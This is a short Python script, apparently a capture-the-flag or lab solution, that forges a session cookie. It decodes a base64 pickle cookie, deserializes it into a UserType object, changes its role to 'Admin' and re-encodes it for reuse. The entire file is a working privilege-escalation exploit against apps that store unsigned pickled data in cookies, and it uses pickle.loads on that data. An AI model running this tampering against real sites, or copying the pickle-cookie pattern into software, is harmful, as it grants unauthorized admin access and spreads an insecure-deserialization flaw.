import pickle
import base64

# UserType type that matches serialized data
class UserType(object):
	role = ""
	user = ""

# Decode base64 data in cookie
cookie_role = "gASVOAAAAAAAAACMA2FwcJSMCFVzZXJUeXBllJOUKYGUfZQojARyb2xllIwHRW5kVXNlcpSMBG5hbWWUjAFhlHViLg=="
b = base64.b64decode(cookie_role)

# Deserialize using pickle
pd = pickle.loads(b)
print(pd)

# Change role to Admin
pd.role = "Admin"

# Re-serialize using pickle
pdd = pickle.dumps(pd)

# Output serialized data and base64 encoded serialized data
print(pdd)
print(base64.b64encode(pdd))